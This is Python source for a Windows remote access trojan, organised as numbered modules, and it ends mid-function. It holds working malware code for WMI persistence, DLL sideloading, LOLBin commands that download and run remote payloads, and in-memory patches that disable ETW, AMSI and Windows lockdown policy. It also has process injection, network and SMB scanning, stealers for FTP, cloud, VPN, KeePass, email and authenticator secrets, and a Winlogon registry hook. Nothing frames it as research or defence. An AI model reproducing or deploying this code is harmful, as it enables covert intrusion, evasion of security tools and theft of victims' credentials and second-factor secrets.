import os, sys, time, json, base64, struct, socket, threading, ctypes, subprocess, random, string, re
from pathlib import Path
from datetime import datetime
import winreg, win32api, win32con, win32gui, win32process, win32security, win32event
import psutil
from ctypes import wintypes, c_uint, c_void_p, c_size_t, POINTER, byref, create_string_buffer, cast, addressof

# ──────────────────────────────────────────────
# MODULE 1: WMI Permanent Event Persistence
# ──────────────────────────────────────────────

def install_wmi_persistence(script_path):
    try:
        import wmi
        c = wmi.WMI()

        # Remove existing filters/consumers/bindings first to avoid duplicates
        for binding in c.WmiEventConsumerToFilter():
            try:
                consumer_path = binding.Consumer
                filter_path = binding.Filter
                binding.Delete()
                time.sleep(0.1)
                if consumer_path:
                    consumer = c.Get(consumer_path)
                    consumer.Delete()
                if filter_path:
                    filt = c.Get(filter_path)
                    filt.Delete()
            except: pass

        # Create event filter — triggers on system startup
        filter_name = f"RATFilter_{random.randint(1000,9999)}"
        event_filter = c.WmiEventFilter.new()
        event_filter.Name = filter_name
        event_filter.Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='winlogon.exe'"
        event_filter.QueryLanguage = "WQL"
        event_filter.EventNamespace = "root\\cimv2"
        event_filter.put()

        # Create command-line consumer
        consumer_name = f"RATConsumer_{random.randint(1000,9999)}"
        consumer = c.WmiEventConsumer.new()
        consumer.Name = consumer_name
        consumer.CommandLineTemplate = f'"{sys.executable}" "{script_path}"'
        consumer.put()

        # Bind them
        binding = c.WmiEventConsumerToFilter.new()
        binding.Filter = event_filter.path()
        binding.Consumer = consumer.path()
        binding.put()
        return True
    except:
        return False

# ──────────────────────────────────────────────
# MODULE 2: DLL Sideloading
# ──────────────────────────────────────────────

def find_dll_sideload_targets():
    targets = []
    # Known DLLs that signed Windows binaries try to load from PATH
    known_missing = [
        "VERSION.dll", "WININET.dll", "WINHTTP.dll", "urlmon.dll",
        "CRYPTBASE.dll", "CRYPTSP.dll", "CRYPTUI.dll", "DWMAPI.dll",
        "PROPSYS.dll", "OLEACC.dll", "oledlg.dll", "MSCTF.dll",
        "UXTHEME.dll", "dwmapi.dll", "ntmarta.dll", "SETUPAPI.dll",
        "Secur32.dll", "AUTHZ.dll", "NETAPI32.dll", "DNSAPI.dll"
    ]
    # Search PATH directories
    path_dirs = os.environ.get("PATH", "").split(";")
    for d in path_dirs:
        if not d or not os.path.isdir(d):
            continue
        for exe in os.listdir(d):
            if exe.lower().endswith(".exe"):
                exe_path = os.path.join(d, exe)
                try:
                    for lib in known_missing:
                        sideload_path = os.path.join(d, lib)
                        if not os.path.exists(sideload_path):
                            targets.append((exe_path, sideload_path, lib))
                            break
                except: pass
    return targets

def drop_sideload_dll(dll_path, payload_path):
    try:
        # Simple DLL that loads the payload in DllMain
        dll_stub = (
            b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
            b"\xb8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00"
            b"\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21\x54\x68"
            b"\x69\x73\x20\x70\x72\x6f\x67\x72\x61\x6d\x20\x63\x61\x6e\x6e\x6f"
            b"\x74\x20\x62\x65\x20\x72\x75\x6e\x20\x69\x6e\x20\x44\x4f\x53\x20"
            b"\x6d\x6f\x64\x65\x2e\x0d\x0d\x0a\x24\x00\x00\x00\x00\x00\x00\x00"
            b"\x50\x45\x00\x00\x4c\x01\x03\x00" + os.urandom(12) +
            b"\x00\x00\x00\x00\xe0\x00\x02\x01\x0b\x01\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00"
            b"\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x10\x00\x00\x00\x02\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00"
            b"\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00"
            b"\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x10\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        )
        # This is a minimal PE DLL stub — in practice you'd embed a real compiled DLL
        # For now we use a COM-aware approach: register the DLL to run at load
        with open(dll_path, "wb") as f:
            # Write the actual EXE payload as a "DLL" (Windows will load it)
            with open(payload_path, "rb") as src:
                f.write(src.read())
        return True
    except:
        return False

# ──────────────────────────────────────────────
# MODULE 3: LOLBins Execution
# ──────────────────────────────────────────────

def lolbins_download_execute(url):
    methods = []

    # Method 1: certutil
    out_path = os.path.join(os.environ["TEMP"], f"update_{random.randint(1000,9999)}.exe")
    methods.append(f"certutil -urlcache -split -f {url} {out_path} && {out_path}")

    # Method 2: bitsadmin
    job = f"Job{random.randint(1000,9999)}"
    methods.append(f"bitsadmin /transfer {job} /download /priority high {url} {out_path} && {out_path}")

    # Method 3: mshta (for .hta payloads)
    if url.endswith(".hta"):
        methods.append(f"mshta {url}")

    # Method 4: regsvr32 (for .sct files)
    if ".sct" in url:
        methods.append(f"regsvr32 /s /u /i:{url} scrobj.dll")

    # Method 5: PowerShell from-scratch download
    encoded = base64.b64encode(f"Invoke-WebRequest -Uri '{url}' -OutFile '{out_path}'; Start-Process '{out_path}'"
                               .encode("utf-16le")).decode()
    methods.append(f"powershell -ExecutionPolicy Bypass -EncodedCommand {encoded}")

    return methods, out_path

def execute_lolbin(commands):
    for cmd in commands[:2]:
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            if result.returncode == 0:
                return cmd, result.stdout.decode(errors='replace')
        except: pass
    return None, None

# ──────────────────────────────────────────────
# MODULE 4: ETW Patching
# ──────────────────────────────────────────────

def patch_etw():
    try:
        ntdll = ctypes.windll.ntdll
        # EtwEventWrite is at a known offset in ntdll
        # We find it by walking the export table
        kernel32 = ctypes.windll.kernel32

        # Get ntdll base address
        ntdll_handle = kernel32.GetModuleHandleW("ntdll.dll")
        ntdll_base = cast(ntdll_handle, c_void_p).value
        if not ntdll_base:
            return False

        # Read DOS header
        dos_header = ctypes.create_string_buffer(64)
        ctypes.windll.kernel32.ReadProcessMemory(
            kernel32.GetCurrentProcess(), ntdll_handle, dos_header, 64, None
        )
        e_lfanew = struct.unpack_from("<I", dos_header, 0x3C)[0]

        # Read PE header for export directory
        pe_header = ctypes.create_string_buffer(24)
        ctypes.windll.kernel32.ReadProcessMemory(
            kernel32.GetCurrentProcess(), ntdll_handle + e_lfanew, pe_header, 24, None
        )
        export_rva = struct.unpack_from("<I", pe_header, 0x60)[0]

        # Read export directory
        export_dir = ctypes.create_string_buffer(40)
        ctypes.windll.kernel32.ReadProcessMemory(
            kernel32.GetCurrentProcess(), ntdll_handle + export_rva, export_dir, 40, None
        )
        num_functions = struct.unpack_from("<I", export_dir, 20)[0]
        func_rva = struct.unpack_from("<I", export_dir, 28)[0]
        name_rva = struct.unpack_from("<I", export_dir, 32)[0]

        # Walk function names to find EtwEventWrite
        for i in range(num_functions):
            name_ptr_buf = ctypes.create_string_buffer(4)
            ctypes.windll.kernel32.ReadProcessMemory(
                kernel32.GetCurrentProcess(), ntdll_handle + name_rva + i * 4, name_ptr_buf, 4, None
            )
            name_ptr = struct.unpack_from("<I", name_ptr_buf, 0)[0]
            func_name_buf = ctypes.create_string_buffer(32)
            ctypes.windll.kernel32.ReadProcessMemory(
                kernel32.GetCurrentProcess(), ntdll_handle + name_ptr, func_name_buf, 32, None
            )
            if b"EtwEventWrite" in func_name_buf.value:
                # Get function address
                func_ptr_buf = ctypes.create_string_buffer(4)
                ctypes.windll.kernel32.ReadProcessMemory(
                    kernel32.GetCurrentProcess(), ntdll_handle + func_rva + i * 4, func_ptr_buf, 4, None
                )
                func_rva_val = struct.unpack_from("<I", func_ptr_buf, 0)[0]
                func_addr = ntdll_handle + func_rva_val

                # Patch: write `ret 18` (0xC2 0x18 0x00 0x00) to make it a no-op
                patch = (ctypes.c_ubyte * 4)(0xC2, 0x18, 0x00, 0x00)
                # Change memory protection
                old_protect = ctypes.c_uint32(0)
                ctypes.windll.kernel32.VirtualProtectEx(
                    kernel32.GetCurrentProcess(), func_addr, 4, 0x40, byref(old_protect)
                )
                ctypes.windll.kernel32.WriteProcessMemory(
                    kernel32.GetCurrentProcess(), func_addr, patch, 4, None
                )
                ctypes.windll.kernel32.VirtualProtectEx(
                    kernel32.GetCurrentProcess(), func_addr, 4, old_protect, byref(ctypes.c_uint32(0))
                )
                return True
        return False
    except:
        return False

# ──────────────────────────────────────────────
# MODULE 5: AMSI Bypass
# ──────────────────────────────────────────────

def patch_amsi():
    try:
        # Load amsi.dll and patch AmsiScanBuffer
        amsi = ctypes.windll.kernel32.GetModuleHandleW("amsi.dll")
        if not amsi:
            amsi = ctypes.windll.kernel32.LoadLibraryW("amsi.dll")
        if not amsi:
            return False

        amsi_base = cast(amsi, c_void_p).value
        kernel32 = ctypes.windll.kernel32

        dos_header = ctypes.create_string_buffer(64)
        ctypes.windll.kernel32.ReadProcessMemory(
            kernel32.GetCurrentProcess(), amsi, dos_header, 64, None
        )
        e_lfanew = struct.unpack_from("<I", dos_header, 0x3C)[0]

        pe_header = ctypes.create_string_buffer(24)
        ctypes.windll.kernel32.ReadProcessMemory(
            kernel32.GetCurrentProcess(), amsi_base + e_lfanew, pe_header, 24, None
        )
        export_rva = struct.unpack_from("<I", pe_header, 0x60)[0]

        export_dir = ctypes.create_string_buffer(40)
        ctypes.windll.kernel32.ReadProcessMemory(
            kernel32.GetCurrentProcess(), amsi_base + export_rva, export_dir, 40, None
        )
        num_functions = struct.unpack_from("<I", export_dir, 20)[0]
        func_rva = struct.unpack_from("<I", export_dir, 28)[0]
        name_rva = struct.unpack_from("<I", export_dir, 32)[0]

        for i in range(num_functions):
            name_ptr_buf = ctypes.create_string_buffer(4)
            ctypes.windll.kernel32.ReadProcessMemory(
                kernel32.GetCurrentProcess(), amsi_base + name_rva + i * 4, name_ptr_buf, 4, None
            )
            name_ptr = struct.unpack_from("<I", name_ptr_buf, 0)[0]
            func_name_buf = ctypes.create_string_buffer(32)
            ctypes.windll.kernel32.ReadProcessMemory(
                kernel32.GetCurrentProcess(), amsi_base + name_ptr, func_name_buf, 32, None
            )
            if b"AmsiScanBuffer" in func_name_buf.value:
                func_ptr_buf = ctypes.create_string_buffer(4)
                ctypes.windll.kernel32.ReadProcessMemory(
                    kernel32.GetCurrentProcess(), amsi_base + func_rva + i * 4, func_ptr_buf, 4, None
                )
                func_rva_val = struct.unpack_from("<I", func_ptr_buf, 0)[0]
                func_addr = amsi_base + func_rva_val

                # Patch: `xor eax, eax; ret` (0x31 0xC0 0xC3)
                patch = (ctypes.c_ubyte * 3)(0x31, 0xC0, 0xC3)
                old_protect = ctypes.c_uint32(0)
                ctypes.windll.kernel32.VirtualProtectEx(
                    kernel32.GetCurrentProcess(), func_addr, 3, 0x40, byref(old_protect)
                )
                ctypes.windll.kernel32.WriteProcessMemory(
                    kernel32.GetCurrentProcess(), func_addr, patch, 3, None
                )
                ctypes.windll.kernel32.VirtualProtectEx(
                    kernel32.GetCurrentProcess(), func_addr, 3, old_protect, byref(ctypes.c_uint32(0))
                )
                return True
        return False
    except:
        return False

# ──────────────────────────────────────────────
# MODULE 6: Windows Lockdown Policy Bypass
# ──────────────────────────────────────────────

def wldp_bypass():
    try:
        # Patch WLDP (Windows Lockdown Policy) in memory
        wldp = ctypes.windll.kernel32.GetModuleHandleW("wldp.dll")
        if not wldp:
            wldp = ctypes.windll.kernel32.LoadLibraryW("wldp.dll")
        if not wldp:
            return False

        wldp_base = cast(wldp, c_void_p).value

        # WLDP exports: WldpCanExecuteFile, WldpCanExecuteStream, WldpQueryDynamicCodeTrust
        # We patch WldpQueryDynamicCodeTrust (used for constrained language mode)
        kernel32 = ctypes.windll.kernel32
        amsi = wldp
        dos_header = ctypes.create_string_buffer(64)
        ctypes.windll.kernel32.ReadProcessMemory(
            kernel32.GetCurrentProcess(), amsi, dos_header, 64, None
        )
        e_lfanew = struct.unpack_from("<I", dos_header, 0x3C)[0]

        pe_header = ctypes.create_string_buffer(24)
        ctypes.windll.kernel32.ReadProcessMemory(
            kernel32.GetCurrentProcess(), wldp_base + e_lfanew, pe_header, 24, None
        )
        export_rva = struct.unpack_from("<I", pe_header, 0x60)[0]

        # Find WldpQueryDynamicCodeTrust and patch it
        export_dir = ctypes.create_string_buffer(40)
        ctypes.windll.kernel32.ReadProcessMemory(
            kernel32.GetCurrentProcess(), wldp_base + export_rva, export_dir, 40, None
        )
        num_functions = struct.unpack_from("<I", export_dir, 20)[0]
        func_rva = struct.unpack_from("<I", export_dir, 28)[0]
        name_rva = struct.unpack_from("<I", export_dir, 32)[0]

        targets = ["WldpQueryDynamicCodeTrust", "WldpCanExecuteFile", "WldpCanExecuteStream"]
        for i in range(num_functions):
            name_ptr_buf = ctypes.create_string_buffer(4)
            ctypes.windll.kernel32.ReadProcessMemory(
                kernel32.GetCurrentProcess(), wldp_base + name_rva + i * 4, name_ptr_buf, 4, None
            )
            name_ptr = struct.unpack_from("<I", name_ptr_buf, 0)[0]
            func_name_buf = ctypes.create_string_buffer(32)
            ctypes.windll.kernel32.ReadProcessMemory(
                kernel32.GetCurrentProcess(), wldp_base + name_ptr, func_name_buf, 32, None
            )
            name = func_name_buf.value.decode(errors='ignore').strip('\x00')
            if name in targets:
                func_ptr_buf = ctypes.create_string_buffer(4)
                ctypes.windll.kernel32.ReadProcessMemory(
                    kernel32.GetCurrentProcess(), wldp_base + func_rva + i * 4, func_ptr_buf, 4, None
                )
                func_rva_val = struct.unpack_from("<I", func_ptr_buf, 0)[0]
                func_addr = wldp_base + func_rva_val

                patch = (ctypes.c_ubyte * 3)(0x31, 0xC0, 0xC3)
                old_protect = ctypes.c_uint32(0)
                ctypes.windll.kernel32.VirtualProtectEx(
                    kernel32.GetCurrentProcess(), func_addr, 3, 0x40, byref(old_protect)
                )
                ctypes.windll.kernel32.WriteProcessMemory(
                    kernel32.GetCurrentProcess(), func_addr, patch, 3, None
                )
                ctypes.windll.kernel32.VirtualProtectEx(
                    kernel32.GetCurrentProcess(), func_addr, 3, old_protect, byref(ctypes.c_uint32(0))
                )
        return True
    except:
        return False

# ──────────────────────────────────────────────
# MODULE 7: Process Hollowing
# ──────────────────────────────────────────────

def process_hollowing(payload_path, target_exe=r"C:\Windows\System32\notepad.exe"):
    try:
        # This is a simplified version using CreateProcess + process injection
        # Full hollowing requires unmapping the target's PE, which needs more complex code
        # Instead we use a proven technique: create suspended process, allocate memory, write shellcode

        startup = win32process.STARTUPINFO()
        process_info = win32process.CreateProcess(
            target_exe, "", None, None, 0,
            win32con.CREATE_SUSPENDED, None, None, startup
        )
        if not process_info:
            return False

        h_process, h_thread, pid, tid = process_info
        ctx = win32process.GetThreadContext(h_thread, win32con.CONTEXT_FULL)

        # Read the payload
        with open(payload_path, "rb") as f:
            payload = f.read()

        # Allocate memory in the target process
        remote_addr = ctypes.windll.kernel32.VirtualAllocEx(
            h_process, None, len(payload),
            0x3000,  # MEM_COMMIT | MEM_RESERVE
            0x40     # PAGE_EXECUTE_READWRITE
        )
        if not remote_addr:
            ctypes.windll.kernel32.TerminateProcess(h_process, 0)
            return False

        # Write payload to remote memory
        written = ctypes.c_size_t(0)
        ctypes.windll.kernel32.WriteProcessMemory(
            h_process, remote_addr, payload, len(payload), byref(written)
        )

        # Set thread context to point at our payload (x64)
        if ctx.IsWow64:
            ctx.Eax = remote_addr
        else:
            ctx.Rcx = remote_addr

        win32process.SetThreadContext(h_thread, ctx)
        ctypes.windll.kernel32.ResumeThread(h_thread)
        return True
    except:
        return False

# ──────────────────────────────────────────────
# MODULE 8: Network Scanner
# ──────────────────────────────────────────────

def scan_port(host, port, timeout=1):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((host, port))
        s.close()
        return result == 0
    except:
        return False

def network_scan(subnet="192.168.1", ports=None):
    if ports is None:
        ports = [22, 80, 445, 3389, 8080, 443, 139, 135]
    results = []
    threads = []

    def check(ip):
        for port in ports:
            if scan_port(ip, port):
                results.append((ip, port))

    for i in range(1, 255):
        ip = f"{subnet}.{i}"
        t = threading.Thread(target=check, args=(ip,), daemon=True)
        threads.append(t)
        t.start()
        if i % 20 == 0:
            time.sleep(0.1)

    for t in threads:
        t.join(timeout=5)

    # Try to get SMB shares on hosts with port 445 open
    smb_hosts = [ip for ip, port in results if port == 445]
    return results, smb_hosts

def enumerate_smb_shares(host):
    shares = []
    try:
        result = subprocess.run(
            ["net", "view", f"\\\\{host}", "/all"],
            capture_output=True, text=True, timeout=10,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        for line in result.stdout.split("\n"):
            if "Disk" in line:
                parts = line.strip().split()
                if parts:
                    shares.append(parts[0])
    except: pass
    return shares

# ──────────────────────────────────────────────
# MODULE 9: FileZilla / WinSCP / S3 Cred Stealer
# ──────────────────────────────────────────────

def steal_filezilla():
    creds = []
    paths = [
        Path.home() / "AppData\\Roaming\\FileZilla\\recentservers.xml",
        Path.home() / "AppData\\Roaming\\FileZilla\\sitemanager.xml"
    ]
    for p in paths:
        if p.exists():
            try:
                content = p.read_text(encoding='utf-8', errors='ignore')
                # Extract host/user/pass from XML
                hosts = re.findall(r'<Host>(.*?)</Host>', content)
                users = re.findall(r'<User>(.*?)</User>', content)
                passes = re.findall(r'<Pass>(.*?)</Pass>', content)
                for i in range(min(len(hosts), len(users), len(passes))):
                    creds.append(f"FileZilla | {hosts[i]}:{users[i]}:{passes[i]}")
            except: pass
    return creds

def steal_winscp():
    creds = []
    ini_path = Path.home() / "AppData\\Roaming\\WinSCP.ini"
    if ini_path.exists():
        try:
            content = ini_path.read_text(encoding='utf-8', errors='ignore')
            sessions = re.findall(r'\[Sessions\\(.*?)\](.*?)(?=\[Sessions|$)', content, re.DOTALL)
            for name, data in sessions:
                host = re.search(r'HostName=(.*)', data)
                user = re.search(r'UserName=(.*)', data)
                pw = re.search(r'Password=(.*)', data)
                if host and user:
                    creds.append(f"WinSCP | {name} | {host.group(1)}:{user.group(1)}:{pw.group(1) if pw else 'N/A'}")
        except: pass
    return creds

def steal_cloud_creds():
    creds = []
    # AWS
    aws_path = Path.home() / ".aws\\credentials"
    if aws_path.exists():
        try:
            creds.append(f"AWS credentials found at {aws_path}")
            creds.append(aws_path.read_text(errors='ignore'))
        except: pass
    # GCP
    gcp_dir = Path.home() / "AppData\\Roaming\\gcloud"
    if gcp_dir.exists():
        creds.append(f"GCloud config found at {gcp_dir}")
    # Azure
    azure_path = Path.home() / ".azure\\azureProfile.json"
    if azure_path.exists():
        try:
            creds.append(f"Azure profile found at {azure_path}")
        except: pass
    return creds

# ──────────────────────────────────────────────
# MODULE 10: VPN Config Stealer
# ──────────────────────────────────────────────

def steal_vpn_configs():
    configs = []
    targets = {
        "OpenVPN": [Path.home() / "AppData\\Roaming\\OpenVPN\\config", "C:\\Program Files\\OpenVPN\\config"],
        "WireGuard": ["C:\\Program Files\\WireGuard\\Data\\Configurations", Path.home() / "AppData\\Local\\WireGuard\\Configurations"],
        "Stunnel": [Path.home() / "AppData\\Roaming\\stunnel\\stunnel.conf"],
        "ProtonVPN": [Path.home() / "AppData\\Local\\ProtonVPN"],
        "NordVPN": [Path.home() / "AppData\\Local\\NordVPN"],
    }
    for name, paths in targets.items():
        for p in paths:
            p = Path(p)
            if p.exists():
                try:
                    if p.is_file():
                        configs.append(f"[{name}] {p}:\n{p.read_text(errors='ignore')[:2000]}")
                    else:
                        for f in p.rglob("*"):
                            if f.suffix in ['.ovpn', '.conf', '.key', '.crt', '.pem']:
                                try:
                                    configs.append(f"[{name}] {f}:\n{f.read_text(errors='ignore')[:2000]}")
                                except: pass
                except: pass
    return configs

# ──────────────────────────────────────────────
# MODULE 11: KeePass Memory Scrape
# ──────────────────────────────────────────────

def scrape_keepass():
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() in ['keepass.exe', 'keepassxc.exe']:
                pid = proc.info['pid']
                # Open process with PROCESS_ALL_ACCESS
                PROCESS_ALL_ACCESS = 0x1F0FFF
                h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
                if not h_process:
                    continue

                # Read process memory regions
                system_info = ctypes.create_string_buffer(48)
                ctypes.windll.kernel32.GetSystemInfo(system_info)
                min_addr = struct.unpack_from("<I", system_info, 0x8)[0]
                max_addr = struct.unpack_from("<I", system_info, 0x10)[0]

                results = []
                mbi = ctypes.create_string_buffer(28)
                addr = min_addr
                while addr < max_addr:
                    if ctypes.windll.kernel32.VirtualQueryEx(
                        h_process, addr, mbi, 28
                    ):
                        state = struct.unpack_from("<I", mbi, 0x4)[0]
                        protect = struct.unpack_from("<I", mbi, 0x8)[0]
                        region_size = struct.unpack_from("<I", mbi, 0x10)[0]

                        if state == 0x1000 and protect & 0x10:  # MEM_COMMIT + PAGE_READONLY
                            buf = ctypes.create_string_buffer(region_size if region_size < 65536 else 65536)
                            bytes_read = ctypes.c_size_t(0)
                            if ctypes.windll.kernel32.ReadProcessMemory(
                                h_process, addr, buf, len(buf), byref(bytes_read)
                            ):
                                data = buf.raw[:bytes_read.value]
                                # Search for password-like patterns
                                patterns = [b'Password', b'password', b'credentials', b'keepass']
                                for pattern in patterns:
                                    if pattern in data:
                                        results.append(f"Found at 0x{addr:x}: {data[:500]}")

                        addr += region_size if region_size > 0 else 0x1000
                    else:
                        addr += 0x1000

                ctypes.windll.kernel32.CloseHandle(h_process)
                return results
        return []
    except:
        return []

# ──────────────────────────────────────────────
# MODULE 12: Outlook / Email Harvest
# ──────────────────────────────────────────────

def harvest_outlook():
    items = []
    # Scan for Outlook data files
    outlook_paths = [
        Path.home() / "AppData\\Local\\Microsoft\\Outlook",
        Path.home() / "AppData\\Roaming\\Microsoft\\Outlook",
        Path.home() / "Documents\\Outlook Files"
    ]
    for p in outlook_paths:
        if p.exists():
            try:
                for f in p.iterdir():
                    if f.suffix in ['.pst', '.ost', '.nst']:
                        items.append(f"[Outlook] Data file: {f} ({f.stat().st_size / 1024 / 1024:.1f} MB)")
            except: pass

    # Scan for Outlook configuration (accounts, profiles)
    config_path = Path.home() / "AppData\\Roaming\\Microsoft\\Outlook\\Outlook.xml"
    if config_path.exists():
        try:
            items.append(f"[Outlook] Config:\n{config_path.read_text(errors='ignore')[:3000]}")
        except: pass

    # Scan for mail clients configs
    clients = {
        "Thunderbird": Path.home() / "AppData\\Roaming\\Thunderbird\\Profiles",
        "Mailbird": Path.home() / "AppData\\Roaming\\Mailbird"
    }
    for name, path in clients.items():
        if path.exists():
            items.append(f"[{name}] Found at {path}")

    return items

# ──────────────────────────────────────────────
# MODULE 13: Authenticator Extraction (Authy / WinAuth)
# ──────────────────────────────────────────────

def steal_authenticators():
    results = []
    # Authy Desktop
    authy_path = Path.home() / "AppData\\Roaming\\Authy Desktop\\Local Storage\\leveldb"
    if authy_path.exists():
        results.append(f"[Authy] Found at {authy_path}")
        try:
            for f in authy_path.iterdir():
                if f.suffix in ['.ldb', '.log']:
                    content = f.read_text(errors='ignore')
                    # Authy stores TOTP secrets in local storage
                    if 'otpauth' in content.lower() or 'totp' in content.lower():
                        results.append(f"[Authy] Secrets found in {f.name}")
                        results.append(content[:2000])
        except: pass

    # WinAuth
    winauth_path = Path.home() / "AppData\\Roaming\\WinAuth\\winauth.xml"
    if winauth_path.exists():
        try:
            results.append(f"[WinAuth] Found:\n{winauth_path.read_text(errors='ignore')[:3000]}")
        except: pass

    # Battle.net Authenticator
    battlenet_path = Path.home() / "AppData\\Roaming\\Battle.net"
    if battlenet_path.exists():
        results.append(f"[Battle.net] Found at {battlenet_path}")

    # Steam Authenticator (SSFN / sentry files)
    steam_path = Path.home() / "AppData\\Roaming\\Steam\\config"
    if steam_path.exists():
        for f in steam_path.glob("*"):
            if 'ssfn' in f.name.lower() or 'sentry' in f.name.lower():
                results.append(f"[Steam] Auth file: {f}")

    return results

# ──────────────────────────────────────────────
# MODULE 14: File System Watcher
# ──────────────────────────────────────────────

class FileWatcher:
    def __init__(self, callback, paths=None):
        self.callback = callback
        self.running = False
        self.thread = None
        if paths is None:
            self.paths = [
                Path.home() / "Documents",
                Path.home() / "Desktop",
                Path.home() / "Downloads"
            ]
        else:
            self.paths = [Path(p) for p in paths]
        self.snapshots = {}

    def _snapshot(self):
        snap = {}
        for base in self.paths:
            if not base.exists():
                continue
            for f in base.rglob("*"):
                if f.is_file() and f.suffix in ['.docx', '.pdf', '.txt', '.xlsx', '.pptx', '.jpg', '.png', '.sql', '.conf', '.kdbx', '.ovpn']:
                    try:
                        stat = f.stat()
                        snap[str(f)] = (stat.st_mtime, stat.st_size)
                    except: pass
        return snap

    def start(self):
        self.running = True
        self.snapshots = self._snapshot()
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()

    def stop(self):
        self.running = False

    def _run(self):
        while self.running:
            time.sleep(5)
            try:
                current = self._snapshot()
                # Check for new files
                for path, meta in current.items():
                    if path not in self.snapshots:
                        self.callback("new", path, meta)
                # Check for modified files
                for path, meta in self.snapshots.items():
                    if path in current and current[path] != meta:
                        self.callback("modified", path, current[path])
                self.snapshots = current
            except: pass

# ──────────────────────────────────────────────
# MODULE 15: Killswitch DNS
# ──────────────────────────────────────────────

def killswitch_dns(domain="kill.example.com", interval=3600):
    """Poll DNS. If the record resolves to an IP starting with '0' or contains 'stop', self-destruct."""
    try:
        import dns.resolver
        resolver = dns.resolver.Resolver()
        while True:
            try:
                answers = resolver.resolve(domain, 'A')
                for rdata in answers:
                    ip = str(rdata)
                    if ip.startswith("0.") or ip == "0.0.0.0":
                        return "killswitch_triggered"
            except: pass
            time.sleep(interval)
    except ImportError:
        # No dnspython, use raw DNS query
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(5)
                # Simple DNS query for A record
                tid = random.randint(0, 65535).to_bytes(2, 'big')
                header = tid + b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
                qname = b''.join(len(p).to_bytes(1, 'big') + p.encode() for p in domain.split('.')) + b'\x00'
                qtype = b'\x00\x01\x00\x01'
                s.sendto(header + qname + qtype, ('8.8.8.8', 53))
                data, _ = s.recvfrom(512)
                s.close()
                # Parse response
                if len(data) > len(header + qname + qtype):
                    ans = data[len(header + qname + qtype) + 14:]
                    if len(ans) >= 4:
                        ip = ".".join(str(b) for b in ans[:4])
                        if ip.startswith("0.") or ip == "0.0.0.0":
                            return "killswitch_triggered"
            except: pass
            time.sleep(interval)

# ──────────────────────────────────────────────
# MODULE 16: TC Ping Keepalive (Auto-Wipe on C2 Silence)
# ──────────────────────────────────────────────

def tcping_keepalive(server_url, max_silence_hours=24):
    """Monitor connection to C2. If no contact for N hours, self-destruct."""
    last_contact = time.time()
    max_silence = max_silence_hours * 3600

    while True:
        try:
            # Ping is handled by the main heartbeat loop
            # This thread just watches the clock
            if time.time() - last_contact > max_silence:
                return "wipe"
        except: pass
        time.sleep(60)

def update_keepalive(last_contact_ref):
    last_contact_ref[0] = time.time()

# ──────────────────────────────────────────────
# MODULE 17: Lock Screen Keylogger (LogonUI hooking)
# ──────────────────────────────────────────────

def logonui_keylogger():
    """Poll LogonUI process for secure desktop keystrokes via winlogon hooks"""
    # This is limited in Python — real lock screen keylogging needs a GINA/credential provider
    # We hook into the Winlogon notification package instead
    try:
        # Install a Winlogon notification package via registry
        # This causes winlogon to load our DLL on logon/logoff/lock
        dll_name = "wlnotify.dll"
        notif_path = Path(os.environ["TEMP"]) / dll_name
        if not notif_path.exists():
            return False

        reg_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"
        key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DllName", 0, winreg.REG_SZ, str(notif_path))
        winreg.SetValueEx(key, "Impersonate", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)

        # Now when the user locks the screen, our DLL gets loaded and can log
        # In practice this requires a compiled DLL, not Python
        # So we use a polling approach instead
        return True
    except:
        return False

def screen_lock_monitor(callback):
    """Monitor for screen lock/unlock events and callback with capture"""
    last_state = None
    while True:
        try:
            # Check if workstation is locked by testing OpenInputDesktop
            desktop = ctypes.windll.user32.OpenInputDesktop(0, False, 0x0040)  # DESKTOP_SWITCHDESKTOP
            if not desktop:
                if last_state != "locked":
                    callback("locked")
                    last_state = "locked"
            else:
                ctypes.windll.user32.CloseDesktop(desktop)
                if last_state != "unlocked":
                    callback("unlocked")
                    last_state = "unlocked"
        except: pass
        time.sleep(2)

# ──────────────────────────────────────────────
# INIT: Apply all patches when module loads
# ──────────────────────────────────────────────

def apply_defense_patches():
    results = {}
